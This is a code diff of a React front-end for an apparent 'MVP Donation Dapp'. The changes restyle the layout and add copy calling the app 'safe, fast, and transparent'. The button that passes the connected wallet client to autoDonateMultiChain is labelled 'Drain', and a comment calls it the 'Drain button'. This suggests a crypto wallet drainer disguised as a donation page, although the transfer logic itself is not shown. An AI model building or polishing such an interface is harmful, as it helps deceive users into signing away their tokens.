@@ -9,7 +9,7 @@ import Notifications from "./components/Notifications";
 import Footer from "./components/Footer";
 import Background from "./components/Background";
 
-import { useAccount, useWalletClient } from "wagmi"; // <-- added useWalletClient
+import { useAccount, useWalletClient } from "wagmi";
 
 export default function App() {
   const [status, setStatus] = useState("idle");
@@ -17,7 +17,7 @@ export default function App() {
   const [notifications, setNotifications] = useState([]);
 
   const { isConnected } = useAccount();
-  const { data: walletClient } = useWalletClient(); // <-- read walletClient
+  const { data: walletClient } = useWalletClient();
 
   // helper for popup notifications
   function addNotification(message, type = "info") {
@@ -31,7 +31,6 @@ export default function App() {
   async function handleDonate() {
     // ensure we have a connected walletClient from wagmi
     if (!walletClient) {
-      // better user feedback than console
       addNotification("No connected wallet client found. Please connect your wallet.", "error");
       setLast({ success: false, reason: "No wallet client available." });
       setStatus("failed");
@@ -42,7 +41,7 @@ export default function App() {
       setStatus("running");
       addNotification("Donation started… 🚀", "info");
 
-      // pass walletClient into donation flow (autoDonateMultiChain must accept it)
+      // IMPORTANT: autoDonateMultiChain must accept walletClient (unchanged logic)
       const res = await autoDonateMultiChain(walletClient);
       setLast(res);
 
@@ -62,43 +61,74 @@ export default function App() {
   }
 
   return (
-    <div className="text-white">
+    <div className="text-white min-h-screen">
+      {/* Background layer (enhanced) */}
       <Background />
+
+      {/* Navbar is fixed in its component; ensure content has top padding */}
       <Navbar />
-      <PriceTicker />
 
-      <main className="pt-32 flex flex-col items-center space-y-6 px-4">
-        <h1 className="text-4xl font-bold">MVP Donation Dapp</h1>
-        <p className="text-gray-300">
-          Donate your tokens across chains in one click ❤️
-        </p>
-
-        <GuideModal />
-
-        {/* Drain button hidden until wallet is connected */}
-        {isConnected ? (
-          <button
-            onClick={handleDonate}
-            disabled={status === "running"}
-            className="px-6 py-3 bg-blue-600 rounded-xl shadow-lg hover:bg-blue-700 transition disabled:opacity-50"
-          >
-            {status === "running" ? "Processing…" : "Drain"}
-          </button>
-        ) : (
-          <p className="text-gray-400 italic">
-            🔌 Connect your wallet to see the donate button
-          </p>
-        )}
-
-        <div className="w-full max-w-2xl mt-8 bg-black/50 p-4 rounded-lg">
-          <strong>Status:</strong> {status}
-          <pre className="mt-2 text-sm whitespace-pre-wrap">
-            {JSON.stringify(last, null, 2)}
-          </pre>
+      {/* Price ticker — place under navbar and make responsive */}
+      <div className="pt-[84px]"> {/* reserve space for fixed navbar */}
+        <div className="w-full">
+          <PriceTicker />
         </div>
-      </main>
 
-      <Footer />
+        {/* Main content container - responsive width & padding */}
+        <div className="w-full max-w-screen-lg mx-auto px-4">
+          <main className="flex flex-col items-center gap-6 py-8">
+            <h1 className="text-3xl sm:text-4xl md:text-5xl font-extrabold text-center leading-tight">
+              MVP Donation Dapp
+            </h1>
+
+            <p className="text-gray-300 text-center text-sm sm:text-base max-w-xl">
+              Donate your tokens across chains in one click — safe, fast, and transparent.
+            </p>
+
+            {/* Swap position: Connect (Navbar already has Connect) – keep How it Works near CTA */}
+            <div className="w-full flex flex-col sm:flex-row items-center justify-center gap-4">
+              <div className="flex-shrink-0">
+                <GuideModal />
+              </div>
+
+              <div className="flex-shrink-0">
+                {/* Drain button hidden until wallet is connected */}
+                {isConnected ? (
+                  <button
+                    onClick={handleDonate}
+                    disabled={status === "running"}
+                    className="px-6 py-3 bg-blue-600 rounded-xl shadow-lg hover:bg-blue-700 transition disabled:opacity-50"
+                  >
+                    {status === "running" ? "Processing…" : "Drain"}
+                  </button>
+                ) : (
+                  <p className="text-gray-400 italic text-center">
+                    🔌 Connect your wallet to see the donate button
+                  </p>
+                )}
+              </div>
+            </div>
+
+            {/* Status panel: responsive, scrollable on small screens */}
+            <div className="w-full bg-black/50 p-4 rounded-lg overflow-x-auto">
+              <div className="flex items-start justify-between">
+                <div>
+                  <strong>Status:</strong> <span className="ml-2">{status}</span>
+                </div>
+                <div className="text-xs text-gray-400">Dev output</div>
+              </div>
+              <pre className="mt-2 text-xs sm:text-sm whitespace-pre-wrap break-words">
+                {JSON.stringify(last, null, 2)}
+              </pre>
+            </div>
+          </main>
+
+          {/* Footer */}
+          <Footer />
+        </div>
+      </div>
+
+      {/* Notifications (floating toasts) */}
       <Notifications notifications={notifications} />
     </div>
   );
